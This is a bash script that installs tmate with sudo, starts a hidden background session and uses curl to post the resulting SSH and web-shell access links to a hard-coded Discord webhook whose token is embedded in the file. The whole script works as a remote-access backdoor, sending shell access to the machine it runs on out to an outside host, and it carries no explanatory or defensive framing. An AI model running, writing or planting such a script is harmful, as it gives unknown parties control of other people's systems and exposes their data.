#!/bin/bash

WEBHOOK="https://discord.com/api/webhooks/1430223801613946973/RIfDKAVui7F1rgvK9tHu795I0xbGg0ouidR_b-6clKN3GRZGQYjiaIG2W--my_XqK4uZ"

echo "[*] Installing tmate..."
if command -v apt >/dev/null 2>&1; then
    sudo apt update -y && sudo apt install -y tmate
elif command -v yum >/dev/null 2>&1; then
    sudo yum install -y epel-release && sudo yum install -y tmate
else
    echo "Unsupported OS"
    exit 1
fi

echo "[*] Starting tmate session..."
tmate -S /tmp/tmate.sock new-session -d
sleep 2

SSH_LINK=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
WEB_LINK=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')

PAYLOAD=$(cat <<EOF
{
  "embeds": [
    {
      "title": "New Tmate Session Started",
      "color": 3066993,
      "fields": [
        {"name": "SSH Access", "value": "$SSH_LINK"},
        {"name": "Web Shell", "value": "$WEB_LINK"}
      ]
    }
  ]
}
EOF
)

curl -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK"
